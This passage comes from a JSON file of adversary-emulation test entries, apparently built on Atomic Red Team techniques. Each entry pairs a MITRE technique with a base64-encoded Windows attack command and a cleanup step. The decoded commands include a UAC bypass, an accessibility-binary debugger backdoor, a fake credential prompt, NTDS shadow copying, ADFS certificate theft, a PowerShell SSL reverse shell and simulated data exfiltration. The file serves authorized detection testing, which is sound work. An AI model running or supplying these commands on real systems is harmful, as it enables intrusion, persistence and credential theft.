a remote system.\n\nUpon successful execution, cmd.exe will create a scheduled task to spawn cmd.exe at 20:10 on a remote endpoint.\n", "variations": []}, {"test": "U3RhcnQtUHJvY2VzcyAkZW52OlRFTVBcVDEwNTkuMDAzX3NjcmlwdC5iYXQ=", "ability_id": "91711bb1e9ad7268f211ad94afa4ccdb", "technique_name": "Command and Scripting Interpreter: Windows Command Shell", "additional_info": {}, "privilege": "", "technique_id": "T1059.003", "platform": "windows", "name": "Create and Execute Batch Script", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gJGVudjpURU1QXFQxMDU5LjAwM19zY3JpcHQuYmF0IC1Gb3JjZSAtRXJyb3JBY3Rpb24gSWdub3Jl"], "executor": "psh", "access": {}, "description": "Creates and executes a simple batch script. Upon execution, CMD will briefly launch to run the batch script then close again.\n", "variations": []}, {"test": "cmVnIGFkZCAiSEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVtIiAvdiBEaXNhYmxlTG9ja1dvcmtzdGF0aW9uIC90IFJFR19EV09SRCAvZCAxIC9m", "ability_id": "8a63804147bfd6681be2d67c6d849bfa", "technique_name": "Modify Registry", "additional_info": {}, "privilege": "", "technique_id": "T1112", "platform": "windows", "name": "Disable Windows Lock Workstation Feature", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["cmVnIGRlbGV0ZSAiSEtFWV9DVVJSRU5UX1VTRVJcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUG9saWNpZXNcU3lzdGVtIiAvdiBEaXNhYmxlTG9ja1dvcmtzdGF0aW9uIC9mID5udWwgMj4mMQ=="], "executor": "cmd", "access": {}, "description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows Lock workstation feature.\nSee how ransomware abuse this technique- https://www.bleepingcomputer.com/news/security/in-dev-ransomware-forces-you-do-to-survey-before-unlocking-computer/\n", "variations": []}, {"test": "JGlucHV0X3RhYmxlID0gIm9zay5leGUsIHNldGhjLmV4ZSwgdXRpbG1hbi5leGUsIG1hZ25pZnkuZXhlLCBuYXJyYXRvci5leGUsIERpc3BsYXlTd2l0Y2guZXhlLCBhdGJyb2tlci5leGUiLnNwbGl0KCIsIik7ICROYW1lID0gIkRlYnVnZ2VyIjsgJFZhbHVlID0gIkM6XHdpbmRvd3Ncc3lzdGVtMzJcY21kLmV4ZSI7IEZvcmVhY2ggKCRpdGVtIGluICRpbnB1dF90YWJsZSl7OyAgICRpdGVtID0gJGl0ZW0udHJpbSgpOyAgICRyZWdpc3RyeVBhdGggPSAiSEtMTTpcU09GVFdBUkVcTWljcm9zb2Z0XFdpbmRvd3MgTlRcQ3VycmVudFZlcnNpb25cSW1hZ2UgRmlsZSBFeGVjdXRpb24gT3B0aW9uc1wkaXRlbSI7ICAgSUYoIShUZXN0LVBhdGggJHJlZ2lzdHJ5UGF0aCkpOyAgIHs7ICAgICBOZXctSXRlbSAtUGF0aCAkcmVnaXN0cnlQYXRoIC1Gb3JjZTsgICAgIE5ldy1JdGVtUHJvcGVydHkgLVBhdGggJHJlZ2lzdHJ5UGF0aCAtTmFtZSAkbmFtZSAtVmFsdWUgJFZhbHVlIC1Qcm9wZXJ0eVR5cGUgU1RSSU5HIC1Gb3JjZTsgICB9OyAgIEVMU0U7ICAgezsgICAgIE5ldy1JdGVtUHJvcGVydHkgLVBhdGggJHJlZ2lzdHJ5UGF0aCAtTmFtZSAkbmFtZSAtVmFsdWUgJFZhbHVlOyAgIH07IH0=", "ability_id": "efc0f99132dfd2d780844ead64c526a2", "technique_name": "Event Triggered Execution: Accessibility Features", "additional_info": {}, "privilege": "", "technique_id": "T1546.008", "platform": "windows", "name": "Attaches Command Prompt as a Debugger to a List of Target Processes", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["JGlucHV0X3RhYmxlID0gIm9zay5leGUsIHNldGhjLmV4ZSwgdXRpbG1hbi5leGUsIG1hZ25pZnkuZXhlLCBuYXJyYXRvci5leGUsIERpc3BsYXlTd2l0Y2guZXhlLCBhdGJyb2tlci5leGUiLnNwbGl0KCIsIik7IEZvcmVhY2ggKCRpdGVtIGluICRpbnB1dF90YWJsZSk7IHs7ICAgJGl0ZW0gPSAkaXRlbS50cmltKCk7ICAgcmVnIGRlbGV0ZSAiSEtFWV9MT0NBTF9NQUNISU5FXFNPRlRXQVJFXE1pY3Jvc29mdFxXaW5kb3dzIE5UXEN1cnJlbnRWZXJzaW9uXEltYWdlIEZpbGUgRXhlY3V0aW9uIE9wdGlvbnNcJGl0ZW0iIC92IERlYnVnZ2VyIC9mIDI+JjEgfCBPdXQtTnVsbDsgfQ=="], "executor": "psh", "access": {}, "description": "Attaches cmd.exe to a list of processes. Configure your own Input arguments to a different executable or list of executables.\n\nUpon successful execution, powershell will modify the registry and swap osk.exe with cmd.exe.\n", "variations": []}, {"test": "IyBDcmVhdGVzIEdVSSB0byBwcm9tcHQgZm9yIHBhc3N3b3JkLiBFeHBlY3QgbG9uZyBwYXVzZSBiZWZvcmUgcHJvbXB0IGlzIGF2YWlsYWJsZS4gICAgOyAkY3JlZCA9ICRob3N0LlVJLlByb21wdEZvckNyZWRlbnRpYWwoJ1dpbmRvd3MgU2VjdXJpdHkgVXBkYXRlJywgJycsW0Vudmlyb25tZW50XTo6VXNlck5hbWUsIFtFbnZpcm9ubWVudF06OlVzZXJEb21haW5OYW1lKTsgIyBVc2luZyB3cml0ZS13YXJuaW5nIHRvIGFsbG93IG1lc3NhZ2UgdG8gc2hvdyBvbiBjb25zb2xlIGFzIGVjaG8gYW5kIG90aGVyIHNpbWlsYXIgY29tbWFuZHMgYXJlIG5vdCB2aXNhYmxlIGZyb20gdGhlIEludm9rZS1BdG9taWNUZXN0IGZyYW1ld29yay47IHdyaXRlLXdhcm5pbmcgJGNyZWQuR2V0TmV0d29ya0NyZWRlbnRpYWwoKS5QYXNzd29yZA==", "ability_id": "6f5096d87a8f9ac4c397215cb58cc978", "technique_name": "Input Capture: GUI Input Capture", "additional_info": {}, "privilege": "", "technique_id": "T1056.002", "platform": "windows", "name": "PowerShell - Prompt User for Password", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Prompt User for Password (Local Phishing) as seen in Stitch RAT. Upon execution, a window will appear for the user to enter their credentials.\n\nReference: https://github.com/nathanlopez/Stitch/blob/master/PyLib/askpass.py\n", "variations": []}, {"test": "QzpcUFNUb29sc1xQc0V4ZWMuZXhlIFxcbG9jYWxob3N0IC11IERPTUFJTlxBZG1pbmlzdHJhdG9yIC1wIFBAc3N3MHJkMSAtYWNjZXB0ZXVsYSAiQzpcV2luZG93c1xTeXN0ZW0zMlxjYWxjLmV4ZSI=", "ability_id": "491a6258d8063dd476af143d2cc3b055", "technique_name": "System Services: Service Execution", "additional_info": {}, "privilege": "", "technique_id": "T1569.002", "platform": "windows", "name": "Use PsExec to execute a command on a remote host", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Requires having Sysinternals installed, path to sysinternals is one of the input input_arguments\nWill start a process on a remote host.\n\nUpon successful execution, cmd will utilize psexec.exe to spawn calc.exe on a remote endpoint (default:localhost).\n", "variations": []}, {"test": "SW52b2tlLUFUSEhUTUxBcHBsaWNhdGlvbiAtVGVtcGxhdGVQRSAtQXNMb2NhbFVOQ1BhdGggLU1TSFRBRmlsZVBhdGggJGVudjp3aW5kaXJcc3lzdGVtMzJcbXNodGEuZXhl", "ability_id": "1d2516dda76448a12a74a392d4d72ec8", "technique_name": "Signed Binary Proxy Execution: Mshta", "additional_info": {}, "privilege": "", "technique_id": "T1218.005", "platform": "windows", "name": "Invoke HTML Application - Simulate Lateral Movement over UNC Path", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Executes an HTA Application with Simulate lateral movement over UNC Path.", "variations": []}, {"test": "SW52b2tlLUFUSENvbXBpbGVkSGVscCAtSW5mb1RlY2hTdG9yYWdlSGFuZGxlciBpdHMgLUhIRmlsZVBhdGggJGVudjp3aW5kaXJcaGguZXhlIC1DSE1GaWxlUGF0aCBUZXN0LmNobQ==", "ability_id": "8ed19c3847fa411cb7fa02d06aae2cf6", "technique_name": "Signed Binary Proxy Execution: Compiled HTML File", "additional_info": {}, "privilege": "", "technique_id": "T1218.001", "platform": "windows", "name": "Invoke CHM with InfoTech Storage Protocol Handler", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Executes a CHM file with the ITS protocol handler.", "variations": []}, {"test": "QWRkLUNvbnRlbnQgLVBhdGggJGVudjpURU1QXE5URlNfQURTLnR4dCAtVmFsdWUgJ1dyaXRlLUhvc3QgIlN0cmVhbSBEYXRhIEV4ZWN1dGVkIicgLVN0cmVhbSAnc3RyZWFtQ29tbWFuZCc7ICRzdHJlYW1jb21tYW5kID0gR2V0LUNvbnRlbnQgLVBhdGggJGVudjpURU1QXE5URlNfQURTLnR4dCAtU3RyZWFtICdzdHJlYW1jb21tYW5kJzsgSW52b2tlLUV4cHJlc3Npb24gJHN0cmVhbWNvbW1hbmQ=", "ability_id": "843bfc63b18f78a56df80c4b42e876f2", "technique_name": "Command and Scripting Interpreter: PowerShell", "additional_info": {}, "privilege": "", "technique_id": "T1059.001", "platform": "windows", "name": "NTFS Alternate Data Stream Access", "requirements": [], "tactic": "execution", "buckets": ["execution"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gJGVudjpURU1QXE5URlNfQURTLnR4dCAtRm9yY2UgLUVycm9yQWN0aW9uIElnbm9yZQ=="], "executor": "psh", "access": {}, "description": "Creates a file with an alternate data stream and simulates executing that hidden code/file. Upon execution, \"Stream Data Executed\" will be displayed.\n", "variations": []}, {"test": "d2hvYW1p", "ability_id": "bd527b63-9f9e-46e0-9816-b8434d2b8989", "technique_name": "System Owner/User Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1033", "platform": "windows", "name": "Current User", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Obtain user from current session", "variations": []}, {"test": "Z2V0LXByb2Nlc3M=", "ability_id": "335cea7b-bec0-48c6-adfb-6066070f5f68", "technique_name": "Process Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1057", "platform": "windows", "name": "View Processes", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Display information about current system processes", "variations": []}, {"test": "bXNpZXhlYy5leGUgL3EgL2kgIiN7bXNpX3BheWxvYWR9Ig==", "ability_id": "688cdf00f9a00a09e17b44bd469002b2", "technique_name": "Signed Binary Proxy Execution: Msiexec", "additional_info": {}, "privilege": "", "technique_id": "T1218.007", "platform": "windows", "name": "Msiexec.exe - Execute Remote MSI file", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Execute arbitrary MSI file retrieved remotely. Less commonly seen in application installation, commonly seen in malware execution. The MSI opens notepad.exe when sucessfully executed.\n", "variations": []}, {"test": "d21pYyAvbm9kZToibG9jYWxob3N0IiBzaGFkb3djb3B5IGNhbGwgY3JlYXRlIFZvbHVtZT1DOlw=", "ability_id": "f049b89533298c2d6cd37a940248b219", "technique_name": "OS Credential Dumping: NTDS", "additional_info": {}, "privilege": "", "technique_id": "T1003.003", "platform": "windows", "name": "Create Volume Shadow Copy remotely with WMI", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "This test is intended to be run from a remote workstation with domain admin context.\nThe Active Directory database NTDS.dit may be dumped by copying it from a Volume Shadow Copy.\n", "variations": []}, {"test": "R2V0LUNoaWxkSXRlbSAtUGF0aCAje2hvc3Quc3lzdGVtLnBhdGh9", "ability_id": "1c353eb4-29ab-4dfe-88ed-f34f5a60848e", "technique_name": "File and Directory Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1083", "platform": "windows", "name": "File and Directory Discovery", "requirements": [{"relationship_match": [{"source": "host.system.path"}], "module": "plugins.stockpile.app.requirements.paw_provenance"}], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Find or discover files on the file system", "variations": []}, {"test": "JHBhdGggPSAiJEVOVjpVc2VyUHJvZmlsZVxEZXNrdG9wXHBjYXAuZXRsIjtOZXctTmV0RXZlbnRTZXNzaW9uIC1OYW1lICJQQ0FQIiAtQ2FwdHVyZU1vZGUgU2F2ZVRvRmlsZSAtTG9jYWxGaWxlUGF0aCAkcGF0aDtBZGQtTmV0RXZlbnRQcm92aWRlciAtTmFtZSAiTWljcm9zb2Z0LVdpbmRvd3MtVENQSVAiIC1TZXNzaW9uTmFtZSAiUENBUCI7U3RhcnQtTmV0RXZlbnRTZXNzaW9uIC1OYW1lICJQQ0FQIjtTdGFydC1TbGVlcCAtcyA2MDtTdG9wLU5ldEV2ZW50U2Vzc2lvbiAtTmFtZSAiUENBUCI7aWYgKFRlc3QtUGF0aCAkcGF0aCkgeyAgZWNobyAkcGF0aDsgIGV4aXQgMDt9IGVsc2UgeyAgZWNobyAiRmFpbGVkIHRvIGdlbmVyYXRlIFBDQVAgZmlsZS4iOyAgZXhpdCAxO307", "ability_id": "1b4fb81c-8090-426c-93ab-0a633e7a16a7", "technique_name": "Network Sniffing", "additional_info": {}, "privilege": "Elevated", "technique_id": "T1040", "platform": "windows", "name": "Sniff network traffic", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 80, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLU5ldEV2ZW50U2Vzc2lvbiAtTmFtZSAiUENBUCI7ClJlbW92ZS1JdGVtICRFTlY6VXNlclByb2ZpbGVcRGVza3RvcFxwY2FwLmV0bDs="], "executor": "psh", "access": {}, "description": "Perform a packet capture", "variations": []}, {"test": "bmx0ZXN0IC9kc2dldGRjOiRlbnY6VVNFUkRPTUFJTg==", "ability_id": "26c8b8b5-7b5b-4de1-a128-7d37fb14f517", "technique_name": "Remote System Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1018", "platform": "windows", "name": "Discover domain controller", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Identify the remote domain controllers", "variations": []}, {"test": "R2V0LUFkR3JvdXAgLUZpbHRlciAq", "ability_id": "f071213a29669283eeb8ab07ddffdbfb", "technique_name": "Permission Groups Discovery: Domain Groups", "additional_info": {}, "privilege": "", "technique_id": "T1069.002", "platform": "windows", "name": "Enumerate Active Directory Groups with Get-AdGroup", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "The following Atomic test will utilize Get-AdGroup to enumerate groups within Active Directory.\nUpon successful execution a listing of groups will output with their paths in AD.\nReference: https://docs.microsoft.com/en-us/powershell/module/activedirectory/get-adgroup?view=windowsserver2022-ps\n", "variations": []}, {"test": "KFthZHNpc2VhcmNoZXJdIm9iamVjdGNhdGVnb3J5PWNvbXB1dGVyIikuRmluZEFsbCgpOyAoW2Fkc2lzZWFyY2hlcl0ib2JqZWN0Y2F0ZWdvcnk9Y29tcHV0ZXIiKS5GaW5kT25lKCk=", "ability_id": "c75a55384a1e7026bb91f841e4ca2ba9", "technique_name": "Remote System Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1018", "platform": "windows", "name": "Enumerate Active Directory Computers with ADSISearcher", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "The following Atomic test will utilize ADSISearcher to enumerate computers within Active Directory.\nUpon successful execution a listing of computers will output with their paths in AD.\nReference: https://devblogs.microsoft.com/scripting/use-the-powershell-adsisearcher-type-accelerator-to-search-active-directory/\n", "variations": []}, {"test": "U2VuZC1NYWlsTWVzc2FnZSAtRnJvbSAje3NlbmRlcn0gLVRvICN7cmVjZWl2ZXJ9IC1TdWJqZWN0ICdUMTAyN19BdG9taWNfVGVzdCcgLUF0dGFjaG1lbnRzICN7aW5wdXRfZmlsZX0gLVNtdHBTZXJ2ZXIgI3tzbXRwX3NlcnZlcn0=", "ability_id": "fcd40bda91ac8562cefe4c91393efb31", "technique_name": "Obfuscated Files or Information", "additional_info": {}, "privilege": "", "technique_id": "T1027", "platform": "windows", "name": "DLP Evasion via Sensitive Data in VBA Macro over email", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using email.\nSensitive data includes about around 20 odd simulated credit card numbers that passes the LUHN check.\n", "variations": []}, {"test": "ZWNobyAkKGdldC11YWMp", "ability_id": "7c42a30c-c8c7-44c5-80a8-862d364ac1e4", "technique_name": "Software Discovery: Security Software Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1518.001", "platform": "windows", "name": "UAC Status", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Determine whether or not UAC is enabled", "variations": []}, {"test": "SW52b2tlLVdlYlJlcXVlc3QgImh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9yZWRjYW5hcnljby9hdG9taWMtcmVkLXRlYW0vbWFzdGVyL2F0b21pY3MvVDEwNzQuMDAxL3NyYy9EaXNjb3ZlcnkuYmF0IiAtT3V0RmlsZSAkZW52OlRFTVBcZGlzY292ZXJ5LmJhdA==", "ability_id": "e6dfc7e89359ac6fa6de84b0e1d5762e", "technique_name": "Data Staged: Local Data Staging", "additional_info": {}, "privilege": "", "technique_id": "T1074.001", "platform": "windows", "name": "Stage data from Discovery.bat", "requirements": [], "tactic": "collection", "buckets": ["collection"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gLUZvcmNlICRlbnY6VEVNUFxkaXNjb3ZlcnkuYmF0IC1FcnJvckFjdGlvbiBJZ25vcmU="], "executor": "psh", "access": {}, "description": "Utilize powershell to download discovery.bat and save to a local file. This emulates an attacker downloading data collection tools onto the host. Upon execution,\nverify that the file is saved in the temp directory.\n", "variations": []}, {"test": "SW1wb3J0LU1vZHVsZSAkZW52OlRFTVBcUG93ZXJWaWV3LnBzMTsgSW52b2tlLVNoYXJlRmluZGVyIC1DaGVja1NoYXJlQWNjZXNz", "ability_id": "60b4ba256941c473d1fb335230c4af07", "technique_name": "Network Share Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1135", "platform": "windows", "name": "PowerView ShareFinder", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "PowerView is a PowerShell tool to gain network situational awareness on Windows domains. ShareFinder finds (non-standard) shares on machines in the domain.", "variations": []}, {"test": "Llwje3BheWxvYWQ6MjhmOWJmNDMtNGYxNC00OTY1LTliZDktYjcwZmQ2OTkzZDhlfSAtU2Nhbg==", "ability_id": "9a30740d-3aa8-4c23-8efa-d51215e8a5b9", "technique_name": "System Network Configuration Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1016", "platform": "windows", "name": "Scan WIFI networks", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["28f9bf43-4f14-4965-9bd9-b70fd6993d8e"], "cleanup": ["UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICIje3BheWxvYWQ6MjhmOWJmNDMtNGYxNC00OTY1LTliZDktYjcwZmQ2OTkzZDhlfSI="], "executor": "psh", "access": {}, "description": "View all potential WIFI networks on host", "variations": []}, {"test": "YXJwIC1h", "ability_id": "a44bb43474728496276d5d73aa14588f", "technique_name": "Remote System Discovery", "additional_info": {}, "privilege": "", "technique_id": "T1018", "platform": "windows", "name": "Remote System Discovery - arp", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "cmd", "access": {}, "description": "Identify remote systems via arp. \n\nUpon successful execution, cmd.exe will execute arp to list out the arp cache. Output will be via stdout.\n", "variations": []}, {"test": "SW52b2tlLUV4cHJlc3Npb24gJGVudjpURU1QXEFEUmVjb24ucHMx", "ability_id": "8e3aa35f5727b48ec9666b444f9d1cdf", "technique_name": "Account Discovery: Domain Account", "additional_info": {}, "privilege": "", "technique_id": "T1087.002", "platform": "windows", "name": "Automated AD Recon (ADRecon)", "requirements": [], "tactic": "discovery", "buckets": ["discovery"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gJGVudjpURU1QXEFEUmVjb24ucHMxIC1Gb3JjZSAtRXJyb3JBY3Rpb24gSWdub3JlIHwgT3V0LU51bGw7IEdldC1DaGlsZEl0ZW0gJGVudjpURU1QIC1SZWN1cnNlIC1Gb3JjZSB8IFdoZXJleyRfLk5hbWUgLU1hdGNoICJeQURSZWNvbi1SZXBvcnQtIn0gfCBSZW1vdmUtSXRlbSAtRm9yY2UgLVJlY3Vyc2U="], "executor": "psh", "access": {}, "description": "ADRecon extracts and combines information about an AD environement into a report. Upon execution, an Excel file with all of the data will be generated and its\npath will be displayed.\n", "variations": []}, {"test": "SW1wb3J0LU1vZHVsZSBBQURJbnRlcm5hbHMgLUZvcmNlOyBFeHBvcnQtQUFESW50QURGU0NlcnRpZmljYXRlczsgR2V0LUNoaWxkSXRlbSB8IFdoZXJlLU9iamVjdCB7JF8gLWxpa2UgIkFERlMqIn07IFdyaXRlLUhvc3QgImBuQ2VydGlmaWNhdGVzIHJldHJpZXZlZCBzdWNjZXNzZnVsbHki", "ability_id": "2d78dfbfea7fa4ec7349993b83048079", "technique_name": "Unsecured Credentials: Private Keys", "additional_info": {}, "privilege": "", "technique_id": "T1552.004", "platform": "windows", "name": "ADFS token signing and encryption certificates theft - Local", "requirements": [], "tactic": "credential-access", "buckets": ["credential-access"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gLVBhdGggIi5cQURGU19lbmNyeXB0aW9uLnBmeCIgLUVycm9yQWN0aW9uIElnbm9yZTsgUmVtb3ZlLUl0ZW0gLVBhdGggIi5cQURGU19zaWduaW5nLnBmeCIgLUVycm9yQWN0aW9uIElnbm9yZQ=="], "executor": "psh", "access": {}, "description": "Retrieve ADFS token signing and encrypting certificates. This is a precursor to the Golden SAML attack (T1606.002). You must be signed in as Administrator on an ADFS server.\nBased on https://o365blog.com/post/adfs/ and https://github.com/fireeye/ADFSDump.\n", "variations": []}, {"test": "JHNlcnZlcl9pcCA9ICN7c2VydmVyX2lwfTsgJHNlcnZlcl9wb3J0ID0gI3tzZXJ2ZXJfcG9ydH07ICRzb2NrZXQgPSBOZXctT2JqZWN0IE5ldC5Tb2NrZXRzLlRjcENsaWVudCgnI3tzZXJ2ZXJfaXB9JywgJyN7c2VydmVyX3BvcnR9Jyk7ICRzdHJlYW0gPSAkc29ja2V0LkdldFN0cmVhbSgpOyAkc3NsU3RyZWFtID0gTmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNlY3VyaXR5LlNzbFN0cmVhbSgkc3RyZWFtLCRmYWxzZSwoeyRUcnVlfSAtYXMgW05ldC5TZWN1cml0eS5SZW1vdGVDZXJ0aWZpY2F0ZVZhbGlkYXRpb25DYWxsYmFja10pKTsgJHNzbFN0cmVhbS5BdXRoZW50aWNhdGVBc0NsaWVudCgnZmFrZS5kb21haW4nLCAkbnVsbCwgIlRsczEyIiwgJGZhbHNlKTsgJHdyaXRlciA9IG5ldy1vYmplY3QgU3lzdGVtLklPLlN0cmVhbVdyaXRlcigkc3NsU3RyZWFtKTsgJHdyaXRlci5Xcml0ZSgnUFMgJyArIChwd2QpLlBhdGggKyAnPiAnKTsgJHdyaXRlci5mbHVzaCgpOyBbYnl0ZVtdXSRieXRlcyA9IDAuLjY1NTM1fCV7MH07OyB3aGlsZSgoJGkgPSAkc3NsU3RyZWFtLlJlYWQoJGJ5dGVzLCAwLCAkYnl0ZXMuTGVuZ3RoKSkgLW5lIDApOyB7JGRhdGEgPSAoTmV3LU9iamVjdCAtVHlwZU5hbWUgU3lzdGVtLlRleHQuQVNDSUlFbmNvZGluZykuR2V0U3RyaW5nKCRieXRlcywwLCAkaSk7OyAkc2VuZGJhY2sgPSAoaWV4ICRkYXRhIHwgT3V0LVN0cmluZyApIDI+JjE7OyAkc2VuZGJhY2syID0gJHNlbmRiYWNrICsgJ1BTICcgKyAocHdkKS5QYXRoICsgJz4gJzs7ICRzZW5kYnl0ZSA9IChbdGV4dC5lbmNvZGluZ106OkFTQ0lJKS5HZXRCeXRlcygkc2VuZGJhY2syKTs7ICRzc2xTdHJlYW0uV3JpdGUoJHNlbmRieXRlLDAsJHNlbmRieXRlLkxlbmd0aCk7JHNzbFN0cmVhbS5GbHVzaCgpfQ==", "ability_id": "0571cd75b6931c2b56799b65aaeb3c90", "technique_name": "Encrypted Channel", "additional_info": {}, "privilege": "", "technique_id": "T1573", "platform": "windows", "name": "OpenSSL C2", "requirements": [], "tactic": "command-and-control", "buckets": ["command-and-control"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": [], "executor": "psh", "access": {}, "description": "Thanks to @OrOneEqualsOne for this quick C2 method.\nThis is to test to see if a C2 session can be established using an SSL socket.\nMore information about this technique, including how to set up the listener, can be found here:\nhttps://medium.com/walmartlabs/openssl-server-reverse-shell-from-windows-client-aee2dbfa0926\n\nUpon successful execution, powershell will make a network connection to 127.0.0.1 over 443.\n", "variations": []}, {"test": "TmV3LUl0ZW0gIkhLQ1U6XHNvZnR3YXJlXGNsYXNzZXNcbXNjZmlsZVxzaGVsbFxvcGVuXGNvbW1hbmQiIC1Gb3JjZTsgU2V0LUl0ZW1Qcm9wZXJ0eSAiSEtDVTpcc29mdHdhcmVcY2xhc3Nlc1xtc2NmaWxlXHNoZWxsXG9wZW5cY29tbWFuZCIgLU5hbWUgIihkZWZhdWx0KSIgLVZhbHVlICJDOlxXaW5kb3dzXFN5c3RlbTMyXGNtZC5leGUiIC1Gb3JjZTsgU3RhcnQtUHJvY2VzcyAiQzpcV2luZG93c1xTeXN0ZW0zMlxldmVudHZ3ci5tc2Mi", "ability_id": "6aaef62bec6838502a36c73e7b728921", "technique_name": "Abuse Elevation Control Mechanism: Bypass User Access Control", "additional_info": {}, "privilege": "", "technique_id": "T1548.002", "platform": "windows", "name": "Bypass UAC using Event Viewer (PowerShell)", "requirements": [], "tactic": "multiple", "buckets": ["multiple"], "timeout": 60, "uploads": [], "parsers": [], "payloads": [], "cleanup": ["UmVtb3ZlLUl0ZW0gIkhLQ1U6XHNvZnR3YXJlXGNsYXNzZXNcbXNjZmlsZSIgLWZvcmNlIC1SZWN1cnNlIC1FcnJvckFjdGlvbiBJZ25vcmU="], "executor": "psh", "access": {}, "description": "PowerShell code to bypass User Account Control using Event Viewer and a relevant Windows Registry modification. More information here - https://enigma0x3.net/2016/08/15/fileless-uac-bypass-using-eventvwr-exe-and-registry-hijacking/\nUpon execution command prompt should be launched with administrative privelages\n", "variations": []}, {"test": "SW52b2tlLVdlYlJlcXVlc3QgLVVyaSAxMjcuMC4wLjEgLU1ldGhvZCBQT1NUIC1Cb2R5IDkwNzBjZF9UMTAyNy1jYy1tYWNyby54bHNt", "ability_id": "bed1124145b52bffa8c9e0607c56f1c8", "technique_name": "Obfuscated Files or Information", "additional_info": {}, "privilege": "", "technique_id": "T1027", "platform": "windows", "name": "DLP Evasion via Sensitive Data in VBA Macro over HTTP", "requirements": [], "tactic": "defense-evasion", "buckets": ["defense-evasion"], "timeout": 60, "uploads": [], "parsers": [], "payloads": ["9070cd_T1027-cc-macro.xlsm"], "cleanup": ["UmVtb3ZlLUl0ZW0gLUZvcmNlIC1QYXRoICI5MDcwY2RfVDEwMjctY2MtbWFjcm8ueGxzbSI="], "executor": "psh", "access": {}, "description": "Upon successful execution, an excel containing VBA Macro containing sensitive data will be sent outside the network using HTTP.\nSensitive data includes about around 20 odd simulated credit card numbers that passes the LUHN check.\n", "variations": []}, {"test": "bmV0c2ggdHJhY2Ugc3RhcnQgY2FwdHVyZT15ZXMgdHJhY2VmaWxlPSV0ZW1wJVx0cmFjZS5ldGwgbWF4c2l6ZT0xMA==", "ability_id": 